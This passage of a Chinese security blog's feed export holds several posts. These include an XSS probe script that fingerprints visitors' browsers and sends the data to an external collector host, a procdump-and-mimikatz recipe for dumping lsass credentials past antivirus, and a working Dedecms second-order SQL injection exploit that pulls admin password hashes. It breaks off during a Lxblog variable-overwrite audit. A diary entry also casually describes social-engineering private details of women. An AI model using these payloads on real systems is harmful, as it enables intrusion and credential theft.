&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;else&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (window.ActiveXObject) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; for (var ii=10;ii&gt;=2;ii–) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;try {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var fl=eval(“new ActiveXObject(’ShockwaveFlash.ShockwaveFlash.”+ii+”’);”);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (fl) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; f=ii + ’.0’;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; break;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; catch(e) {}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return f;}(); //java版本info.java = deployJava.getJREs();7. function json2str(o) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var arr = [];&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var fmt = function(s) {&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; if (typeof s == ’object’ &amp;&amp; s != null) return json2str(s);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; return /^(string|number)$/.test(typeof s) ? “”” + s + “”” : s;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;for (var i in o) arr.push(“”” + i + “”:” + fmt(o[i]));&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return ’{’ + arr.join(’,’) + ’}’;}&nbsp;8. var i = json2str(info);x=new Image();x.src = “http://xssprobe.sinaapp.com/probe.php?id={projectId}&amp;c=&quot;+i;//自定义复制代码 设置参数： &nbsp; 代码2：根目录下新建文件probe.php 1. &lt;?phpif (!empty($_GET[“c”])){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;$data = quotes($_GET[“c”]);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;$ar_data = json_decode(urldecode($data), true);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;header(“Location:http://xssprobe.sinaapp.com/index.php?do=api&amp;id={$_GET[id]}&amp;browser_name={$ar_data[browser][name]}&amp;browser_version={$ar_data[browser][version]}&amp;language={$ar_data[lang]}&amp;domain={$ar_data[domain]}&amp;screen={$ar_data[screen]}&amp;flash_version={$ar_data[flash]}&amp;Osystem={$ar_data[system]}&amp;java_version={$ar_data[java][0]}&quot;);}function quotes($content){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if(get_magic_quotes_gpc()){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; if(is_array($content)){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;foreach($content as $key=&gt;$value){&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;$content[$key] = stripslashes($value);&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }else{&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$content = stripslashes($content);}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}else{}&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;return $content;}2. ?&gt;复制代码]]></content>
      <categories>
        <category>HTML|CSS|JS|xss|xml</category>
      </categories>
      <tags>
        <tag>xss探针</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[杂事]]></title>
    <url>%2F2013%2F07%2F22%2F%E6%9D%82%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 很久没写博客了，很久不看除计算机类和课本以外的书了，很久没有出去玩过了，很久没有脱离电脑了！ 很矛盾，很无聊。 &nbsp; &nbsp; 这几天xx了一些xx，社工了一些xx，人生百态，每一个人都是平凡人，她们也没有什么不同了，一样的喜怒哀乐，或许她们长得比较女神，仅此区别。 &nbsp; &nbsp; 从中提取两个人，他们有个共同点，都是美女。 &nbsp; &nbsp; 第一个，算一个二线女星吧，每月收入在25万到35万左右，出道时拍过很多很暴露且很诱惑的的写真来博取眼球，算成功了吧，各种人际关系，各种人情世故，各种接待应酬，各种时间安排，各种欺骗观众，可能你觉得这些对于一个在你心目中的女神来说是不可以出现的，但是其实她也就是一个比一般人长得好看一点的动物，都很正常，每个人无非都是在这个社会中争扎、夺取，只是方法不一样而已。再说她那男演员男朋友不敢恭维，上妆过后还是一个帅哥，卸妆过后就??????（各种吐槽10万字），年龄相差10岁，但名利可以拉近距离，可能这样说的比较直白。 &nbsp; &nbsp; 第二个，一个普通的人，兼职一些平面模特工作（淘女郎之类的），没有什么其他的了，什么恋爱、失恋和一般人一样，学校时代都很干净不在乎其它的，进入社会以后父母看法，工作地点，房子等等，到最后两个人的交流基本都是以前信用卡的账单怎么算。今天加了她的qq，直接被她拉黑了。汗！！！！ &nbsp; &nbsp; 其实她还是一个很优秀的人，学习不错，爱跳舞，写过小说，社会实践也很多，亚马逊的订单基本都是书，各种抄经，比较迷性与算命，呵呵！！ &nbsp; &nbsp; 还有几个，什么电影学院的学生，什么经纪人，什么摄影师???? &nbsp; &nbsp; 形形色色，没有其他的什么感情色彩看待他们的人生，我也只是看着，就像看一场话剧，只是演出的比较真实而已。]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[mimikatz的一个新技巧]]></title>
    <url>%2F2013%2F06%2F09%2Fmimikatz%E7%9A%84%E4%B8%80%E4%B8%AA%E6%96%B0%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 刚看见一篇文章讲mimikatz的一个技巧，很多时候我们抓取明文的时候遇到杀毒软件，使得我的抓取失败。 &nbsp; &nbsp; 我们先利用微软的一个工具procdump.exe 有微软签名的东西，杀毒软件必须放过啊！ &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C: empprocdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp &nbsp; &nbsp; copy dmp文件回本地然后再用mimikatz查看明文密码： &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;mimikatz # sekurlsa::minidump SUPERCOMPUTER_lsass.dmp &nbsp;&nbsp;&nbsp;&nbsp;mimikatz # sekurlsa::logonPasswords full 原文:http://www.room362.com/blog/2013/6/7/using-mimikatz-alpha-or-getting-clear-text-passwords-with-a.html &nbsp; &nbsp; &nbsp; &nbsp;http://blog.gentilkiwi.com/securite/mimikatz/minidump]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>mimikatz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[emlog日志远程图片本地化插件sae版]]></title>
    <url>%2F2013%2F06%2F07%2Femlog%E6%97%A5%E5%BF%97%E8%BF%9C%E7%A8%8B%E5%9B%BE%E7%89%87%E6%9C%AC%E5%9C%B0%E5%8C%96%E6%8F%92%E4%BB%B6sae%E7%89%88%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 有时候觉得一篇文章不错，想要复制到自己博客记录下，但是各种图片很多，手动上传和下载太麻烦了，于是乎我百度了下emlog的插件，发现有一个，但是不是sae版的，于是移植了过来。 &nbsp; 思路： &nbsp; &nbsp; 使用curl获取远程图片 &nbsp; &nbsp; 用storage的write函数写入 &nbsp; 代码: &nbsp; &lt;?php /&#42 Plugin Name: 图片本地化 Version: 1.2 Plugin URL:http://www.qiyuuu.com/for-emlog/emlog-plugin-images-to-local Description: 保存日志时将日志中的远程图片本地化 Author: 奇遇 Author Email: qiyuuu@gmail.com Author URL: http://www.qiyuuu.com/ &#42/ function img2local($logid) { global $logData; $Log_Model = new Log_Model(); $isImg2local = isset($_POST[’img2local’]) ? trim($_POST[’img2local’]) : ’’; if(!$isImg2local) { return; } $logData[’content’] = stripslashes($logData[’content’]); $logData[’excerpt’] = stripslashes($logData[’excerpt’]); $logData[’content’] = preg_replace_callback("/&lt;img([^&gt;]+)src="([^&gt;"]+)"?([^&gt;]&#42)&gt;/i","image2local",$logData[’content’]); $logData[’excerpt’] = preg_replace_callback("/&lt;img([^&gt;]+)src="([^&gt;"]+)"?([^&gt;]&#42)&gt;/i","image2local",$logData[’excerpt’]); $logData[’content’] = addslashes($logData[’content’]); $logData[’excerpt’] = addslashes($logData[’excerpt’]); $Log_Model-&gt;updateLog($logData,$logid); } addAction(’save_log’, ’img2local’); function image2local($matches) //code by L.N. { $url = parse_url($matches[2]); $host = ’lanu-upload.stor.sinaapp.com’; if(isset($url[’host’]) &amp;&amp; $url[’host’] != $host) { global $blogid; $imgName = md5(addslashes($matches[2])); $path = $url[’path’]; if(!empty($url[’query’])) { $path .= ’?’ . $url[’query’]; } $http_request = "GET $path HTTP/1.0 "; $http_request .= "ACCEPT: &#42/&#42 "; $http_request .= "ACCEPT-LANGUAGE: zh-cn "; $http_request .= "USER_AGENT: ".$_SERVER[’HTTP_USER_AGENT’]." "; $http_request .= "HOST: ".$url[’host’]." "; $http_request .= "CONNECTION: close "; $response = ’’; if(FALSE != ($fs = @fsockopen($url[’host’], empty($url[’port’]) ? 80 : $url[’port’], $errno, $errstr, 10))) { fwrite($fs, $http_request); while (!feof($fs)) { $response .= fgets($fs, 1160); } fclose($fs); $response = explode(" ", $response, 2); preg_match("/Content-Type: (.&#42) /i",$response[0],$imgType); $imgType = $imgType[1]; $imgExt = strtolower(substr(strrchr($matches[2], "."),1)); if(empty($imgExt)) { if($imgType == ’image/pjpeg’ || $imgType == ’image/jpeg’) { $imgExt = ’jpg’; } elseif ($imgType == ’image/x-png’ || $imgType == ’image/png’) { $imgExt = ’png’; } elseif ($imgType == ’image/gif’) { $imgExt = ’gif’; } elseif ($imgType == ’image/bmp’) { $imgExt = ’bmp’; } else { $imgExt = ’jpg’; } } $sea_imgName = $imgName.".".$imgExt; $sea_url = "http://".$url[’host’].$path; $s2 = new SaeStorage(); $ch = curl_init(); $user_agent = $_SERVER[’HTTP_USER_AGENT’]; curl_setopt($ch,CURLOPT_URL,$sea_url); curl_setopt($ch,CURLOPT_HEADER,false); curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); curl_setopt($ch,CURLOPT_USERAGENT,$user_agent); $temp=curl_exec($ch); if(empty($temp)){ emMsg(’文件获取失败’,"javascript:history.go(-1);"); } $sea_new_url = $s2-&gt;write(’upload’,date("Ym").’/’.$sea_imgName,$temp); if(empty($sea_new_url)){ emMsg(’上传失败’,"javascript:history.go(-1);"); } } else { return "&lt;img{$matches[1]}src="{$matches[2]}"{$matches[3]}&gt;"; } return "&lt;img{$matches[1]}src="{$sea_new_url}"{$matches[3]}&gt;"; } else { return "&lt;img{$matches[1]}src="{$matches[2]}"{$matches[3]}&gt;"; } } function img2local_option() { ?&gt; &lt;input type="checkbox" value="1" name="img2local" checked="checked" /&gt;图片本地化 &lt;?php } addAction(’adm_writelog_head’, ’img2local_option’);]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>sae</tag>
        <tag>emlog</tag>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【记录】Novell Zenworks MDM: Mobile Device Management for the Masses]]></title>
    <url>%2F2013%2F06%2F07%2F%E3%80%90%E8%AE%B0%E5%BD%95%E3%80%91Novell-Zenworks-MDM-Mobile-Device-Management-for-the-Masses%2F</url>
    <content type="text"><![CDATA[笔记：一个本地包含+session缓存文件==“远程”文件包含 原文：http://console-cowboys.blogspot.ca/2013/06/novell-zenworks-mdm-mobile-device.html 注意：需要翻墙！]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[hacking with powershell]]></title>
    <url>%2F2013%2F06%2F05%2Fhacking-with-powershell%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp;&nbsp;Windows PowerShell优秀和强大的东西，hacker们怎么使用他呢？ &nbsp;&nbsp;&nbsp;&nbsp;要考试继续写链接，考完看！ http://labofapenetrationtester.blogspot.ca/2013/04/poshing-the-hashes.html http://labofapenetrationtester.blogspot.in/2013/05/poshing-hashes-part-2.html http://www.youtube.com/watch?v=XpHgSHQZNpU http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/ http://pen-testing.sans.org/blog/2012/04/27/presentation-powershell-for-pen-testers]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Veil一个生成免杀metepreter的工具]]></title>
    <url>%2F2013%2F06%2F02%2FVeil%E4%B8%80%E4%B8%AA%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80metepreter%E7%9A%84%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 今天看见非常优秀的工具，作为一个对逆向那块基本小白的我来说真是一个神器，傻瓜化的操作绕过主流杀毒软件！ &nbsp; &nbsp; &nbsp;https://www.christophertruncer.com/veil-a-payload-generator-to-bypass-antivirus/]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Dedecms 二次注入经典exp构造]]></title>
    <url>%2F2013%2F05%2F03%2FDedecms-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E7%BB%8F%E5%85%B8exp%E6%9E%84%E9%80%A0%2F</url>
    <content type="text"><![CDATA[0x01&nbsp;前言&lt;o:p&gt;&lt;/o:p&gt; Long&nbsp;long&nbsp;ago,yy@safekeyer.com发现dedecms二次注入的一个经典代码审计中二次攻击的案例，但限于字段大小不能超过60字节而显得比较鸡肋，在safekeyer集体的智慧之下发现两种突破办法。&lt;o:p&gt;&lt;/o:p&gt; &nbsp;&nbsp;&nbsp;此文重在exp的构造，如需详细漏洞分析，请看：http://www.wooyun.org/bugs/wooyun-2010-018562&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 0x02&nbsp;方法一：直接缩短法&lt;o:p&gt;&lt;/o:p&gt; 理论：insert&nbsp;–&gt;&nbsp;select&nbsp;–&gt;insert&nbsp;–&gt;select&nbsp;&lt;o:p&gt;&lt;/o:p&gt; Exp:（红色表示重点数据）&lt;o:p&gt;&lt;/o:p&gt; 第一次insert&lt;o:p&gt;&lt;/o:p&gt; http://127.0.0.1/dede/plus/feedback.php&lt;o:p&gt;&lt;/o:p&gt; ?action=send&lt;o:p&gt;&lt;/o:p&gt; &amp;comtype=comments&lt;o:p&gt;&lt;/o:p&gt; &amp;aid=1&lt;o:p&gt;&lt;/o:p&gt; &amp;isconfirm=yes&lt;o:p&gt;&lt;/o:p&gt; &amp;cmtuser=admin&lt;o:p&gt;&lt;/o:p&gt; &amp;msg=asfsafsdaf&lt;o:p&gt;&lt;/o:p&gt; &amp;face=6&lt;o:p&gt;&lt;/o:p&gt; &amp;validate=slep&lt;o:p&gt;&lt;/o:p&gt; &amp;title=1’,”’”,1,3,4,5,6,7,8,(select&nbsp;pwd&nbsp;from&nbsp;%23@__admin))%23&lt;o:p&gt;&lt;/o:p&gt; &amp;sbbt=%E5%8F%91%E9%80%81%E8%AF%84%E8%AE%BA&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 第二次insert&lt;o:p&gt;&lt;/o:p&gt; http://127.0.0.1/dede/plus/feedback.php&lt;o:p&gt;&lt;/o:p&gt; ?action=send&lt;o:p&gt;&lt;/o:p&gt; &amp;comtype=reply&lt;o:p&gt;&lt;/o:p&gt; &amp;fid=27&lt;o:p&gt;&lt;/o:p&gt; &amp;isconfirm=yes&lt;o:p&gt;&lt;/o:p&gt; &amp;cmtuser=admin&lt;o:p&gt;&lt;/o:p&gt; &amp;msg=asfsafsdaf&lt;o:p&gt;&lt;/o:p&gt; &amp;face=6&lt;o:p&gt;&lt;/o:p&gt; &amp;validate=angr&lt;o:p&gt;&lt;/o:p&gt; &amp;title=1&lt;o:p&gt;&lt;/o:p&gt; &amp;sbbt=%E5%8F%91%E9%80%81%E8%AF%84%E8%AE%BA&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 看出我们第一次insert的payload是：&lt;o:p&gt;&lt;/o:p&gt; 1’,”’”,1,3,4,5,6,7,8,(select&nbsp;pwd&nbsp;from&nbsp;%23@__admin))%23&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 数据库：&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 返回结果：&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 绕过具体代码分析：&lt;o:p&gt;&lt;/o:p&gt; function CheckSql($db_string,$querytype=’select’) { ?????（此处省略） while (TRUE) { $pos = strpos($db_string, ’’’, $pos + 1); if ($pos === FALSE) { break; } $clean .= substr($db_string, $old_pos, $pos - $old_pos); while (TRUE) { $pos1 = strpos($db_string, ’’’, $pos + 1); $pos2 = strpos($db_string, ’\’, $pos + 1); if ($pos1 === FALSE) { break; } elseif ($pos2 == FALSE || $pos2 &gt; $pos1) { $pos = $pos1; break; } $pos = $pos2 + 1; } $clean .= ’$s$’; $old_pos = $pos + 1; } $clean .= substr($db_string, $old_pos); //echo $clean;exit(); $clean = trim(strtolower(preg_replace(array(’~s+~s’ ), array(’ ’), $clean))); ????（此处省略） } 上述检测代码作用就是替换sql语句中两个引号之间的内容为$s$&lt;o:p&gt;&lt;/o:p&gt; 第二次insert的sql:&lt;o:p&gt;&lt;/o:p&gt; INSERT&nbsp;INTO&nbsp;&lt;o:p&gt;&lt;/o:p&gt; #@__feedback(aid,typeid,username,arctitle,ip,ischeck,dtime,mid,bad,good,ftype,face,msg)&nbsp;&lt;o:p&gt;&lt;/o:p&gt; VALUES&nbsp;(’1’,’0’,’test’,’1’,”’”,1,3,4,5,6,7,8,(select&nbsp;pwd&nbsp;from&nbsp;dede_admin))#’,’127.0.0.1’,’1’,’1367583435’,’2’,’0’,’0’,’feedback’,’6’,’asfsafsdaf’)&lt;o:p&gt;&lt;/o:p&gt; 经过上述处理：&lt;o:p&gt;&lt;/o:p&gt; INSERT&nbsp;INTO&nbsp;&lt;o:p&gt;&lt;/o:p&gt; dede_feedback(aid,typeid,username,arctitle,ip,ischeck,dtime,mid,bad,good,ftype,face,msg)&nbsp;&lt;o:p&gt;&lt;/o:p&gt; VALUES&nbsp;($s$,$s$,$s$,$s$,”$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$)&lt;o:p&gt;&lt;/o:p&gt; 然后function&nbsp;CheckSql($db_string,$querytype=’select’)得检测绕过了。&lt;o:p&gt;&lt;/o:p&gt; 重点在关于单引号的处理，用双引号引上单引号，使单引号作为字符串，单引号在绕过注入检测起了重要作用，又使之在完整的insert不能发挥单引号作用，只作为字符串。&lt;o:p&gt;&lt;/o:p&gt; 0x03&nbsp;方法二：两次插入结合法&lt;o:p&gt;&lt;/o:p&gt; 理论：insert&nbsp;–&gt;&nbsp;select&nbsp;–&gt;insert&nbsp;–&gt;select&lt;o:p&gt;&lt;/o:p&gt; Exp:（红色表示重点数据）&lt;o:p&gt;&lt;/o:p&gt; 第一次insert&lt;o:p&gt;&lt;/o:p&gt; http://127.0.0.1/dede/plus/feedback.php&lt;o:p&gt;&lt;/o:p&gt; ?action=send&lt;o:p&gt;&lt;/o:p&gt; &amp;comtype=comments&lt;o:p&gt;&lt;/o:p&gt; &amp;aid=1&lt;o:p&gt;&lt;/o:p&gt; &amp;isconfirm=yes&lt;o:p&gt;&lt;/o:p&gt; &amp;cmtuser=admin&lt;o:p&gt;&lt;/o:p&gt; &amp;msg=asfsafsdaf&lt;o:p&gt;&lt;/o:p&gt; &amp;face=6&lt;o:p&gt;&lt;/o:p&gt; &amp;validate=slep&lt;o:p&gt;&lt;/o:p&gt; &amp;title=1’,(char(@’)),/&amp;#42&lt;o:p&gt;&lt;/o:p&gt; &amp;sbbt=%E5%8F%91%E9%80%81%E8%AF%84%E8%AE%BA&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 第二次insert&lt;o:p&gt;&lt;/o:p&gt; http://127.0.0.1/dede/plus/feedback.php&lt;o:p&gt;&lt;/o:p&gt;/&amp;#42&amp;#42/from/&amp;#42&amp;#42/dede_member/&amp;#42&amp;#42/limit/&amp;#42&amp;#42/1))%23) ?aid=1&lt;o:p&gt;&lt;/o:p&gt; &amp;action=send&lt;o:p&gt;&lt;/o:p&gt; &amp;comtype=reply&lt;o:p&gt;&lt;/o:p&gt; &amp;fid=48&lt;o:p&gt;&lt;/o:p&gt; &amp;isconfirm=yes&lt;o:p&gt;&lt;/o:p&gt; &amp;validate=craf&lt;o:p&gt;&lt;/o:p&gt; &amp;msg=&amp;#42/1,2,3,4,5,6,7,(select/&amp;#42&amp;#42/concat(userid,0x3a,pwd)/&amp;#42&amp;#42/from/&amp;#42&amp;#42/dede_member/&amp;#42&amp;#42/limit/&amp;#42&amp;#42/1))%23&lt;o:p&gt;&lt;/o:p&gt; 通过两次insert向数据库中插入payload的不同部分，然后组合起来成为一个完整的payload&lt;o:p&gt;&lt;/o:p&gt; 第一次插入：1’,(char(@’)),/&amp;#42&lt;o:p&gt;&lt;/o:p&gt; 第二次插入：&amp;#42/1,2,3,4,5,6,7,(select/&amp;#42&amp;#42/concat(userid,0x3a,pwd)/&amp;#42&amp;#42/from/&amp;#42&amp;#42/dede_member/&amp;#42&amp;#42/limit/&amp;#42&amp;#42/1))%23&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 组成最后完整的语句：&lt;o:p&gt;&lt;/o:p&gt; INSERT&nbsp;INTO&nbsp;&lt;o:p&gt;&lt;/o:p&gt; #@__feedback(aid,typeid,username,arctitle,ip,ischeck,dtime,mid,bad,good,ftype,face,msg)&nbsp;&lt;o:p&gt;&lt;/o:p&gt; VALUES&nbsp;(’1’,’0’,’test’,’1’,(char(@’)),/&amp;#42’,’127.0.0.1’,’1’,’1367591176’,’2’,’0’,’0’,’feedback’,’0’,’@’&amp;#42/,2,3,4,5,6,7,8,(selectconcat(userid,0x7c,pwd)from#@__admin))’)&lt;o:p&gt;&lt;/o:p&gt; 经过防注入函数处理：&lt;o:p&gt;&lt;/o:p&gt; insert&nbsp;into&nbsp;dede_feedback(aid,typeid,username,arctitle,ip,ischeck,dtime,mid,bad,good,ftype,face,msg)&nbsp;values&nbsp;($s$,$s$,$s$,$s$,(char(@`$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$,$s$)&lt;o:p&gt;&lt;/o:p&gt; 完全没有问题绕过。&lt;o:p&gt;&lt;/o:p&gt; 数据库：&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 返回结果：&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 0x03&nbsp;结束语&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 如有错误希望指正，如有建议希望讨论。www.safekeyer.com]]></content>
      <categories>
        <category>0day漏洞</category>
      </categories>
      <tags>
        <tag>dedecms</tag>
        <tag>exp</tag>
        <tag>二次注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lxblog代码审计之变量覆盖]]></title>
    <url>%2F2013%2F04%2F11%2FLxblog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%2F</url>
    <content type="text"><![CDATA[废话：&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;lxblog是www.phpwind.net开发的多人博客系统，现在好像已经停止更新了！&nbsp; 声明：&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;本文只做技术研究，请勿非法使用，一起后果与本人无关！&nbsp; 正文：&nbsp; 关键文件：/mod/ajax_mod.php&nbsp; `if (!empty($_POST)) {&nbsp; &nbsp;&nbsp;$_POST = Char_cv($_POST);&nbsp; &nbsp;&nbsp;if ($db_charset != ’utf-8’) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;require_once(R_P.’mod/charset_mod.php’);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;foreach ($_POST as $key =&gt; $value) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${’utf8_’.$key} = $value;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${$key} = convert_charset(’utf-8’,$db_charset,$value);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp;} else {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;foreach ($_POST as $key =&gt; $value) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${’utf8_’.$key} = ${$key} = $value; //变量覆盖了&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;}&nbsp; &nbsp;&nbsp;}&nbsp; }` 变量覆盖导致注入漏洞&nbsp; 重点文件：/ajax.php&nbsp; `if ($action==’vote’) {&nbsp; &nbsp;&nbsp;!$winduid &amp;&amp; exit(’not_login’);//变量覆盖绕过&nbsp; &nbsp;&nbsp;(int)$votenum &lt; 1 &amp;&amp; exit(’erro_voteid’);//变量覆盖绕过&nbsp; &nbsp;&nbsp;$voteitem = array();&nbsp; &nbsp;&nbsp;$query = $db-&gt;query(“SELECT id,voteduid FROM pw_voteitem WHERE vid=’$vid’”);//漏洞来了，进入query()函数&nbsp; &nbsp;&nbsp;while ($rt = $db-&gt;fetch_array($query)) {&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;strpos(“,$rt[voteduid],”,”,$winduid,”)!==false &amp;&amp; exit(’have_voted’);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$voteitem[$rt[’id’]] = $rt[’voteduid’];&nbsp; &nbsp;&nbsp;}` 漏洞文件:/mod/db_mysql.php&nbsp; `function query($SQL,$method=’’){//覆盖?量 $GLOBALS[’PW’] 形成注入&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$GLOBALS[’PW’]!=’pw_’ &amp;&amp; $SQL = str_replace(’ pw_’,’ ’.$GLOBALS[’PW’],$SQL);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$query = ($method==’U_B’ &amp;&amp; function_exists(’mysql_unbuffered_query’)) ? @mysql_unbuffered_query($SQL) : @mysql_query($SQL);&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;query_num++;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;!$query &amp;&amp; 